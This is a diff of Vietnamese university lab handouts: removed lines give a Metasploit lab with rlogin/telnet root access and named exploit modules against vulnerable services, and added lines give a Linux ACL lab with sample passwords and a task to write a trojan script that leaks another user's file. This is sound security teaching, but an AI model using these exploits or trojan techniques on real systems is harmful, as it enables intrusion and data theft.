@@ -1,91 +1,89 @@
-Khai thác lỗ hổng trên các dịch vụ sử dụng Metasploit
-
-Mục đích:
-Giúp sinh viên nắm được quy trình và thực hiện một tấn công khai thác lỗ hổng đã biết bằng cách sử dụng công cụ Metasploit.
-Yêu cầu đối với sinh viên:
-Có kiến thức cơ bản về hệ điều hành Linux, Kali, công cụ metasploit, các lỗ hổng dịch vụ cơ bản: rlogin, ingreslock, distccd, IRC daemon, VSFtpd, Samba, HTTP, Postgres.
 Nội dung thực hành
-Khởi động bài lab:
-Vào terminal, gõ:
-labtainer -r metasploit
+Chuẩn bị lab
 
- (chú ý: sinh viên sử dụng <TÊN_TÀI_KHOẢN> của mình để nhập thông tin người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.)
+Khởi động lab:
+labtainer -r acl
 
-Sau khi khởi động xong hai terminal ảo sẽ xuất hiện, một cái là đại diện cho máy tấn công: attacker, một cái là đại diện cho máy nạn nhân: victim.
+ (chú ý: sinh viên sử dụng <Mã sinh viên> của mình để nhập thông tin người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.)
 
-Xác định IP của các máy
-Trên terminal attacker và victim sử dụng lệnh “ifconfig”, địa chỉ IP sẽ nằm sau “inet adddr:”
-Sử dụng câu lệnh “ping” để kiểm tra kết nối từ máy attacker đến máy Victim. Kết quả cần đạt được “ping” thực hiện thành công, có phản hồi từ máy Victim.
-Sử dụng công cụ “nmap” để quét các dịch vụ có thể tấn công. Kết quả cần đạt được tìm ra các cổng có thể tấn công vào máy Victimnếu có (trong bài lab mặc định các cổng dịch vụ đều mở để có thể tấn công).
-nmap -p0-65535 <IP victim>
+Sau khi khởi động bài lab, 3 thiết bị đầu cuối ảo sẽ được bật chế động login, hãy đăng nhập theo các tài khoản dưới đây:
+User
 
-Khai thác dịch vụ
+Password
 
-Khai thác dịch vụ cấu hình rlogin (cổng 513) để truy nhập từ xa đến máy của Victim (với đặc quyền root). Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
-rlogin -l root <IP victim>
+bob
 
-cat /root/filetoview.txt
+password4bob
 
-Khai thác dịch vụ ingreslock (cổng 1524). Sử dụng telnet để truy cập vào dịch vụ ingreslock và có được quyền root. Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
-telnet <IP victim> <cổng dịch vụ>
+alice
 
-cat /root/filetoview.txt
+password4alice
 
-Khai thác dịch vụ distccd (cổng 3632). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công dịch vụ distccd.
-search distccd
+harry
 
-sử dụng công cụ khai thác “exploit”
-use exploit/unix/misc/distcc_exec
+password4harry
 
-xem cấu hình liên quan đến “exploit”
-options
+Các nhiệm vụ
 
-Đặt “RHOST”
-set RHOST 192.168.1.2
+Trong bài thực hành này, bạn sẽ sử dụng các lệnh getfacl và setfacl để xem và sửa đổi ACL trên tệp. Sử dụng tùy chọn -h để tìm hiểu về các lệnh này,
 
-Thực hiện khai thác lỗ hổng
-exploit
+ví dụ: getfacl -h.
 
-Khai thác lỗ hổng IRC daemon (cổng 6667). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng unreal_ircd.
-search unreal_ircd
+Nhiệm vụ 1: Xem lại các quyền trên các file hiện có
 
-sử dụng công cụ khai thác “exploit”
-use exploit/unix/irc/unreal_ircd_3281_backdoor
+Trên terminal “Alice”, hãy đến thư mục /shared data và liệt kê các quyền trên file, thư mục:
+cd /shared_data
 
-đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
-Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
-Khai thác dịch vụ VSFtpd (cổng 21). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng vsftpd_234.
-search vsftpd_234
+ls -l
 
-sử dụng công cụ khai thác “exploit”
-use exploit/unix/ftp/vsftpd_234_backdoor
+Chúng ta sẽ thấy các quyền trên file accounting.txt và 2 thư mục. Kiểm tra xem“Alice” có thể xem nội dung file accounting.txt hay không? Sử dụng lệnh cat để đọc file.
+Nhìn lại vào danh sách quyền truy cập các file, thư mục. Lưu ý với file accounting.txt có cài đặt quyền là:
+-rw-rw----+
 
-đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
-Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
-Khai thác dịch vụ Samba service (cổng 139). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng samba usermap_script.
-search usermap_script
+Biểu tượng + ở cuối cho biết tệp này có thêm quản lý bằng ACL ngoài các quyền UNIX tiêu chuẩn "rw" cho người dùng và nhóm người dùng. Ta kiểm tra quyền ACL của file này sử dụng lệnh:
+         getfacl accounting.txt
 
-sử dụng công cụ khai thác “exploit”
-use exploit/multi/samba/usermap_script
+Chú ý chỉ 1 trong 3 người dùng có quyền sửa đổi với file passcode.txt, hãy chuyển đến terminal của người dùng đó thực hiện lệnh:
+         echo "more stuff" >> /shared_data/accounting.txt
 
-đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
-Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
-Khai thác dịch vụ HTTP (cổng 80). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng php_cgi.
-search php_cgi
+Quay trở lại terminal “alice”, thực hiện lệnh sửa đổi file ở trên để xác nhận rằng “alice” không có quyền sửa đổi file này.
+Nhiệm vụ 2: Cài đặt ACL trên một file
 
-sử dụng công cụ khai thác “exploit”
-use exploit/multi/http/php_cgi_arg_injection
+Với tư cách là người dùng Bob, hãy sử dụng lệnh setfacl để cho phép Alice đọc file /shared_data/bob/bobstuff.txt. Sau đó, với tư cách là người dùng Alice, hãy xác nhận khả năng đọc tệp này. Đồng thời, với tư cách là người dùng Harry, hãy xác nhận rằng anh ta không có quyền đọc file này.
 
-đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
-Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
-Khai thác dịch vụ Postgres (cổng 5432). Khởi chạy trình điều khiển Metasploit là “msfconsole”. Tìm và tấn công lỗ hổng postgres_payload.
-search postgres_payload
+Setfacl –m “u:alice:r” /shared_data/bob/bobstuff.txt
 
-sử dụng công cụ khai thác “exploit”
-use exploit/linux/postgres/postgres_payload
+Nhiệm vụ 3: Cài đặt ACL mặc định cho 1 thư mục
 
-đặt “RHOST” nếu cần thiết và chạy khai thác lỗ hổng
-Kết quả cần đạt được truy cập thành công đến máy Victim với quyền root và mở được file trên máy Victim.
+Với tư cách là người dùng Alice, tạo một ACL mặc định sao cho bất cứ khi nào Alice tạo một file mới trong thưc mục /shared data/alice, file mới đó sẽ có thể được đọc bởi Alice và Bob thôi.
+
+Tạo một file trong /shared_data/alice và kiểm tra quyền của nó.
+Đặt ACL mặc định trên thư mục alice để cho phép ngoài Alice chỉ Bob đọc các file mới được tạo.
+setfacl –dm “u:bob:r” /shared_data/alice/
+
+setfacl –dm “o::--x” /shared_data/alice/
+
+Tạo một file mới khác trong /shared_data/alice và kiểm tra quyền của nó.
+echo “attt-ptit” > ./alice/attt.txt
+
+getfacl ./alice/attt.txt
+
+Kiểm tra Bob có thể đọc được file attt.txt, còn Harry thì không thể.
+cat /shared_data/alice/attt.txt
+
+Nhiệm vụ 4: Trojan Horses
+
+Kiểm tra lại phân quyền cho file /shared_data/accounting.txt. Bob không thể đọc file này nhưng anh ý rất muốn biết nội dung của nó. Bob biết Alice kém về nghệ thuật ASCII nên anh ý đã tạo ra một script /shared_data/bob/fun. Bob sửa script đó sao cho nếu Alice (hay Harry) chạy script này nó sẽ tạo ra một bản sao của file accounting.txt theo một cách nào đó cho phép Bob nhìn thấy nội dung. Cần chắc chắn rằng khi Bob chạy script này, nó không cung cấp cho Bob khả năng truy cập vào dữ liệu. Nhưng khi nó được chạy bởi Alice thì Bob có thể tiếp cận được thông tin. Chúc ý sự khác nhau giữa việc Bob có thể truy cập được file và việc Bob có khả năng tiếp cận được thông tin trong file.
+
 Kết thúc bài lab:
+
 Trên terminal đầu tiên sử dụng câu lênh sau để kết thúc bài lab:
-stoplab metasploit
+stoplab acl
+
+Khi bài lab kết thúc, một tệp lưu kết quả được tạo và lưu vào một vị trí được hiển thị bên dưới stoplab.
+Để kiểm tra kết quả khi trong khi làm bài thực hành sử dụng lệnh: checkwork <tên bài thực hành>
+Khởi động lại bài lab:
+
+Trong quá trình làm bài sinh viên cần thực hiện lại bài lab, dùng câu lệnh:
+
+labtainer  –r acl
